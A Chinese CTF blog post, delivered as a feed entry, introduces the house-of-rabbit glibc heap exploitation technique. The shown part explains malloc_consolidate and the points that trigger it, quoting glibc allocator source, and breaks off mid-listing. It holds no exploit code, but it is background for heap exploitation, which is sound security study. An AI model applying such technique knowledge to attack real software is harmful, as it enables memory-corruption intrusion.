    <updated>2025-03-21T16:11:44.931Z</updated>
    
    <content type="html"><![CDATA[<ul><li><code>house-of-rabbit</code>利用就被称为<code>fastbin_dup_consolidate</code>利用。</li></ul><h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1><h2 id="malloc_consolidate函数"><a class="markdownIt-Anchor" href="#malloc_consolidate函数"></a> malloc_consolidate函数</h2><ul><li>在<code>malloc</code>中有一个函数，这个函数是一个特别的版本的<code>free</code>和<code>合并</code>，之前我们在<code>malloc</code>流程分析的时候会看到有<code>free</code>和<code>合并</code>，这个操作就是通过<code>malloc_consolidate</code>这个函数来实现的。<code>consolidate</code>在英文中就有合并的意思。</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250306150614976.png" alt="image-20250306150614976"></p><ul><li>我们就来介绍一下这个函数的具体过程：<ul><li><code>malloc_consolidate</code>首先会从存储堆块大小更小的fastbin逐一遍历里面的chunk，每遍历到一个chunk，就会处理这个chunk<ul><li>如果这个chunk的<code>prev_inuse</code>位为<code>0</code>就会进行后向合并</li><li>如果这个chunk的相邻高地址chunk是<code>top_chunk</code>，它就会和<code>top_chunk</code>合并</li><li>如果这个chunk的相邻高地址chunk是空闲的，该chunk就会进行前向合并</li><li><code>chunk</code>如果没有与<code>top chunk</code>相邻就会使用头插法将<code>被处理的chunk</code>放入<code>unsorted bin</code>中</li><li>如果<code>chunk</code>的<code>size</code>不在<code>smallbin</code>的范围内就先会设置<code>fd_nextsize</code>和<code>bk_nextsize</code>为<code>NULL</code></li></ul></li></ul></li></ul><h2 id="触发malloc_consolidate函数"><a class="markdownIt-Anchor" href="#触发malloc_consolidate函数"></a> 触发malloc_consolidate函数</h2><ul><li>现在我们来探究一下何时何时会触发这个函数。这里我参考的是实验部分的注释，实验部分的注释已经讲得很明白了，什么时候会触发<code>malloc_consolidate</code>函数。</li><li>这里我们就通过几个小而简短的代码，来看看如何触发<code>malloc_consolidate</code>函数。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> _int_malloc: 一个处于large sized范围的chunk正在被分配</span><br><span class="line"><span class="number">2.</span> _int_malloc: 没有适合的bins被寻找重新申请回去并且top chunk太小了不能满足<span class="built_in">malloc</span>的申请</span><br><span class="line"><span class="number">3.</span> _int_free: 如果这个chunk的大小&gt;= FASTBIN_CONSOLIDATION_THRESHOLD (<span class="number">65536</span>)</span><br><span class="line"><span class="number">4.</span> mtrim: 总是调用 </span><br><span class="line"><span class="number">5.</span> __libc_mallopt: 总是调用</span><br></pre></td></tr></table></figure><h2 id="相关代码"><a class="markdownIt-Anchor" href="#相关代码"></a> 相关代码</h2><ul><li>首先执行<code>consolidate</code>最重要的就是<code>malloc_consolidate</code>这个函数，主要就看<code>malloc_consolidate</code>主要的作用和<code>malloc</code>、<code>free</code>中何时调用<code>malloc_consolidate</code>这个函数</li></ul><details>    <summary>相关宏定义</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 告诉malloc之后要整理fastbin</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取unsorted_bin</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span></span><br></pre></td></tr></table></figure></details><details>    <summary>malloc_consolidate</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Also, because this routine needs to be called the first time through</span></span><br><span class="line"><span class="comment">  malloc anyway, it turns out to be the perfect place to trigger</span></span><br><span class="line"><span class="comment">  initialization code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">    unsorted_bin-&gt;fd = p;</span><br><span class="line">    first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    p-&gt;bk = unsorted_bin;</span><br><span class="line">    p-&gt;fd = first_unsorted;</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></details><ul><li>接下来介绍触发<code>malloc_consolidate</code>这个函数的五个地方</li></ul><details>    <summary>_int_malloc_触发malloc__consolidate</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">    hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">    (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">    processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">    anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">    While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">    even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">    fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">    Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">    large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">    invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">    it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     idx = largebin_index (nb);</span><br><span class="line">     <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">       malloc_consolidate (av);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></details><details>    <summary>_int_malloc中使用malloc_consolidate(top chunk)</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">    use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>_int_free中malloc_consolidate</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))</span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>malloc_trim</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ malloc_trim ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">mtrim</span> <span class="params">(mstate av, <span class="type">size_t</span> pad)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Don&#x27;t touch corrupt arenas.  */</span></span><br><span class="line">  <span class="keyword">if</span> (arena_is_corrupt (av))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure initialization/consolidation */</span></span><br><span class="line">  malloc_consolidate (av);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> ps = GLRO (dl_pagesize);</span><br><span class="line">  <span class="type">int</span> psindex = bin_index (ps);</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> psm1 = ps - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; NBINS; ++i)</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">1</span> || i &gt;= psindex)</span><br><span class="line">      &#123;</span><br><span class="line">        mbinptr bin = bin_at (av, i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (mchunkptr p = last (bin); p != bin; p = p-&gt;bk)</span><br><span class="line">          &#123;</span><br><span class="line">            INTERNAL_SIZE_T size = chunksize (p);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (size &gt; psm1 + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> malloc_chunk))</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="comment">/* See whether the chunk contains at least one unused page.  */</span></span><br><span class="line">                <span class="type">char</span> *paligned_mem = (<span class="type">char</span> *) (((<span class="type">uintptr_t</span>) p</span><br><span class="line">                                                + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> malloc_chunk)</span><br><span class="line">                                                + psm1) &amp; ~psm1);</span><br><span class="line"></span><br><span class="line">                assert ((<span class="type">char</span> *) chunk2mem (p) + <span class="number">4</span> * SIZE_SZ &lt;= paligned_mem);</span><br><span class="line">                assert ((<span class="type">char</span> *) p + size &gt; paligned_mem);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* This is the size we could potentially free.  */</span></span><br><span class="line">                size -= paligned_mem - (<span class="type">char</span> *) p;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (size &gt; psm1)</span><br><span class="line">                  &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MALLOC_DEBUG</span></span><br><span class="line">                    <span class="comment">/* When debugging we simulate destroying the memory</span></span><br><span class="line"><span class="comment">                       content.  */</span></span><br><span class="line">                    <span class="built_in">memset</span> (paligned_mem, <span class="number">0x89</span>, size &amp; ~psm1);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                    __madvise (paligned_mem, size &amp; ~psm1, MADV_DONTNEED);</span><br><span class="line"></span><br><span class="line">                    result = <span class="number">1</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">  <span class="keyword">return</span> result | (av == &amp;main_arena ? systrim (pad, av) 